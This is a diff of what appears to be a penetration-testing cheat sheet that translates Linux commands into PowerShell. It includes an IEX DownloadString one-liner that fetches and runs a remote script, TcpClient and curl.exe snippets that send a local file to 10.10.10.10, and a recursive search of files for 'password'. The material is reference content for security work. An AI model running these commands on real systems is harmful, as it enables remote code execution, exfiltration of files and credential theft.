@@ -284,35 +284,45 @@ iwr http://10.10.10.10/file.txt -o file.txt
 ```
 {% endcode %}
 
-<pre class="language-powershell" data-title="nc $IP $PORT < $FILE"><code class="lang-powershell">$client = New-Object System.Net.Sockets.TcpClient
-<strong>$client.Connect("10.10.10.10", 1337)
-</strong>$writer = New-Object System.IO.StreamWriter($client.GetStream())
-<strong>$bytes = (Get-Content -Encoding byte "C:\Windows\win.ini")
-</strong>$writer.BaseStream.Write($bytes, 0, $bytes.Length)
-$writer.Flush()
-</code></pre>
-
 {% code title="curl $IP | sh" %}
 ```powershell
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/script.ps1');
 ```
 {% endcode %}
 
+<pre class="language-powershell" data-title="nc $IP $PORT < $FILE"><code class="lang-powershell">$client = New-Object System.Net.Sockets.TcpClient
+<strong>$client.Connect("10.10.10.10", 8000)
+</strong>$writer = New-Object System.IO.StreamWriter($client.GetStream())
+<strong>$bytes = (Get-Content -Encoding byte "C:\Windows\win.ini")
+</strong>$writer.BaseStream.Write($bytes, 0, $bytes.Length)
+$writer.Flush()
+</code></pre>
+
+&#x20;<mark style="color:blue;">**↳**</mark> For larger file transfers, you can also do this over HTTP with [`python3 -m uploadserver`](https://pypi.org/project/uploadserver/):
+
+```powershell
+curl.exe -X POST http://10.10.10.10:8000/upload -F 'files=@C:\Windows\win.ini'
+```
+
 ### Files
 
-<pre class="language-powershell" data-title="grep -ri $PATTERN"><code class="lang-powershell"><strong>dir -Recurse | Select-String -Pattern "password"
+<pre class="language-powershell" data-title="find"><code class="lang-powershell"><strong>Get-ChildItem -File -Recurse -ErrorAction SilentlyContinue
+</strong># Or to get a nice tree view:
+<strong>tree /F
 </strong></code></pre>
 
-<pre class="language-powershell" data-title="history" data-overflow="wrap"><code class="lang-powershell"><strong>Get-History
-</strong># Raw method below can bypass Clear-History
-<strong>type (Get-PSReadlineOption).HistorySavePath
-</strong># Get verbose script block events (may be large)
-<strong>Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath "*[System[EventID=4104]]" | Export-Csv -Path 'ScriptBlockEvents.csv' -NoTypeInformation
+<pre class="language-powershell" data-title="grep -ri $PATTERN"><code class="lang-powershell"><strong>dir -Recurse | Select-String -Pattern "password"
 </strong></code></pre>
 
 <pre class="language-powershell" data-title="Check permissions"><code class="lang-powershell"><strong>icacls C:\Path\To\DirOrFile
 </strong># Output reference: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls#remarks
 </code></pre>
+
+{% code title="List disks (C:\, D:\, etc.)" %}
+```powershell
+wmic logicaldisk get deviceid,volumename,description
+```
+{% endcode %}
 
 ### Miscellaneous
 
